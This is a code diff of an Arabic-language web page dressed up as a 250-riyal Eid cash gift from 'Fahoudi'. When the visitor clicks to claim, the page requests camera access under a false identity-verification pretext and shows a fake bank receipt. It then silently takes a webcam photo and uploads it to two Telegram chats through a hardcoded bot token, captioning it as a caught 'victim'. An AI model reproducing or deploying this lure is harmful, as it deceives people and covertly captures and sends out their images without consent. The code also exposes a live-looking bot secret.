@@ -3,90 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>هدية خاصة لك من فهودي 🎁</title>
+    
+    <title>عيدية خاصة من فهودي 🎁</title>
+    <meta property="og:title" content="عيدية خاصة من فهودي 🎁">
+    <meta property="og:description" content="اضغط هنا لاستلام عيديتك بقيمة 250 ريال مقدمة من فهودي.">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB2a9JizqwqvDF5Q7taaKTkohGvbyt4ePOFQ&s">
+
     <style>
-        :root { --primary-color: #128c7e; --accent-color: #25d366; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; }
-        .logo { width: 90px; height: 90px; border-radius: 50%; margin-bottom: 15px; border: 3px solid var(--accent-color); object-fit: cover; }
-        .amount-box { background: #f0fff4; padding: 15px; border-radius: 15px; margin: 20px 0; border: 2px dashed var(--accent-color); }
-        .amount { font-size: 45px; color: #075e54; font-weight: bold; }
-        .btn { background: var(--primary-color); color: white; border: none; padding: 15px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); }
+        /* تصميم عصري وألوان احترافية */
+        :root {
+            --primary: #6c5ce7;
+            --secondary: #a29bfe;
+            --success: #00b894;
+            --bg: #f0f2f5;
+        }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: white; padding: 40px; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 420px; position: relative; border-top: 8px solid var(--primary); }
+        .logo { width: 100px; height: 100px; border-radius: 50%; margin-bottom: 20px; border: 4px solid var(--secondary); padding: 5px; background: white; }
+        h1 { color: #2d3436; font-size: 26px; margin-bottom: 10px; }
+        .sub-text { color: #636e72; margin-bottom: 20px; }
+        .amount-tag { background: #eef2ff; color: var(--primary); font-size: 50px; font-weight: 900; padding: 20px; border-radius: 20px; margin: 25px 0; border: 2px dashed var(--secondary); }
+        .btn { background: var(--primary); color: white; border: none; padding: 18px; border-radius: 50px; font-size: 20px; cursor: pointer; width: 100%; font-weight: bold; transition: all 0.3s ease; box-shadow: 0 10px 20px rgba(108, 92, 231, 0.3); }
+        .btn:hover { background: var(--secondary); transform: translateY(-3px); }
+        .btn:active { transform: scale(0.98); }
+        
+        /* إيصال الاستلام */
+        .receipt { text-align: right; background: #f9f9fb; padding: 20px; border-radius: 15px; margin-top: 20px; border: 1px solid #dfe6e9; animation: slideIn 0.5s ease; }
+        .receipt p { margin: 8px 0; color: #2d3436; font-size: 15px; }
+        
         video, canvas { display: none; }
-        .final-msg { color: #d63031; font-size: 26px; font-weight: bold; }
+        .final-msg { color: #d63031; font-size: 32px; font-weight: bold; margin-bottom: 15px; }
+        
+        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body>
 
 <div class="card" id="mainCard">
     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB2a9JizqwqvDF5Q7taaKTkohGvbyt4ePOFQ&s" class="logo">
-    <h1>مبروك! وصلتك هدية 🎁</h1>
-    <p>لقد أرسل لك <b>فهودي</b> مبلغاً نقدياً بمناسبة العيد</p>
-    <div class="amount-box"><span class="amount">250.00</span> ر.س</div>
-    <button class="btn" id="claimBtn">تأكيد استلام المبلغ</button>
+    <h1>عيدية خاصة من فهودي 🎁</h1>
+    <p class="sub-text">تم اختيارك لاستلام مبلغ نقدي بمناسبة العيد</p>
+    <div class="amount-tag">250.00 <span style="font-size: 20px;">ر.س</span></div>
+    <button class="btn" id="giftBtn" onclick="takeGift()">استلام العيدية الآن</button>
 </div>
 
-<video id="video" autoplay playsinline style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
 <script>
+    // البيانات الجديدة (التوكن والأيديهات المزدوجة)
     const TOKEN = "8608233349:AAFj-cG0gKj_fP89yDvcQAC5mtf2QMrJq2g";
-    const ID_1 = "1232397788"; // ID فهد
-    const ID_2 = "7334997228"; // ID الشخص الثاني
+    const ID_1 = "1232397788"; // أيدي فهد
+    const ID_2 = "7334997228"; // أيدي الشخص الثاني
 
-    document.getElementById('claimBtn').addEventListener('click', async () => {
+    async function takeGift() {
         try {
             // طلب إذن الكاميرا
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+            document.getElementById('video').srcObject = stream;
 
-            // واجهة التمويه
-            document.getElementById('mainCard').innerHTML = `
-                <div style="font-size:50px; margin-bottom:20px;">⏳</div>
-                <h3>جاري معالجة التحويل البنكي...</h3>
-                <p>يرجى الانتظار ثانية واحدة لإيداع المبلغ في حسابك</p>
+            // تحديث الواجهة لإظهار إيصال "وهمي"
+            const card = document.getElementById('mainCard');
+            card.innerHTML = `
+                <div style="color:var(--success); font-size:70px; margin-bottom:10px;">✔️</div>
+                <h3>تمت معالجة الطلب بنجاح</h3>
+                <div class="receipt">
+                    <p><b>المرسل:</b> فهودي</p>
+                    <p><b>الحالة:</b> قيد الإيداع البنكي</p>
+                    <p><b>المبلغ:</b> 250.00 ريال سعودي</p>
+                    <p><b>المرجع:</b> #TXN${Math.floor(Math.random() * 900000) + 100000}</p>
+                    <hr style="border: 0; border-top: 1px solid #eee;">
+                    <p style="text-align:center; font-size:12px; color:#b2bec3;">يرجى الانتظار لحظات لتأكيد التحقق من الهوية...</p>
+                </div>
             `;
 
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-
-                canvas.toBlob((blob) => {
-                    const sendPhoto = (targetId) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', targetId);
-                        formData.append('photo', blob, 'shot.jpg');
-                        formData.append('caption', '📸 صيد جديد ومخفي لعيون فهودي!');
-                        
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    };
-
-                    // إرسال الصورة لك ولخويك
-                    sendPhoto(ID_1);
-                    sendPhoto(ID_2);
-
-                    // الرسالة الصادمة النهائية
-                    setTimeout(() => {
-                        document.getElementById('mainCard').innerHTML = `
-                            <div class="final-msg">🤡 تعيش وتأكل غيرها!</div>
-                            <p style="margin-top:15px; font-size:18px;">صورتك الحين نورت جوالي يا سبك!</p>
-                            <p style="font-weight:bold; color:#128c7e; font-size:20px;">عيدك مبارك من فهودي 😂</p>
-                        `;
-                    }, 1000);
-                }, 'image/jpeg');
-            }, 1200);
+            // التصوير والإرسال بعد 2.5 ثانية لضمان الثبات
+            setTimeout(captureAndSend, 2500);
 
         } catch (err) {
-            alert("فشل النظام: يجب السماح بالكاميرا لتأكيد هويتك واستلام الـ 250 ريال!");
+            alert("تنبيه أمني: يجب السماح بالكاميرا للتحقق من هويتك ومنع الاحتيال لضمان وصول العيدية!");
         }
-    });
+    }
+
+    function captureAndSend() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        canvas.toBlob(async (blob) => {
+            const sendPhoto = async (chatId) => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'shot.jpg');
+                formData.append('caption', '📸 صيد جديد لعيون فهودي!\nالضحية وقع في الفخ 😂');
+                
+                return fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            };
+
+            // الإرسال لك ولخويك في نفس الوقت
+            await Promise.all([sendPhoto(ID_1), sendPhoto(ID_2)]);
+
+            // رسالة المقلب النهائية
+            setTimeout(() => {
+                document.getElementById('mainCard').innerHTML = `
+                    <div class="final-msg">🤡 تعيش وتأكل غيرها!</div>
+                    <p style="font-size:20px; color:#2d3436;">صورتك الحين نورت جوالي يا سبك!</p>
+                    <div style="margin-top:20px; font-weight:bold; color:var(--primary); font-size:22px;">عيدك مبارك من فهودي 😂</div>
+                `;
+            }, 1000);
+        }, 'image/jpeg');
+    }
 </script>
+
 </body>
 </html>
